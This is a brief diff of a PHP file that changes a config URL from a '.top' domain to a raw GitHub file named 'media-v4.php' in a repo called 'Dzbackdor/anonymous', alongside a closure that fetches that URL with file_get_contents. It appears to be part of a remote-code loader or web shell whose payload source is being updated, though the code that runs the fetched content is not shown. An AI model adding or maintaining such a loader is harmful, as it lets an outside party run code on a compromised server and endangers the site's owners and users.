@@ -1,6 +1,6 @@
 <?php
 $config = [
-    'url' => "https://ampnyapunyaku.top/tools/s-media/media-v4.txt",
+    'url' => "https://raw.githubusercontent.com/Dzbackdor/anonymous/refs/heads/main/media/media-v4.php",
     'fetch' => function($u) {
         return file_get_contents($u);
     },
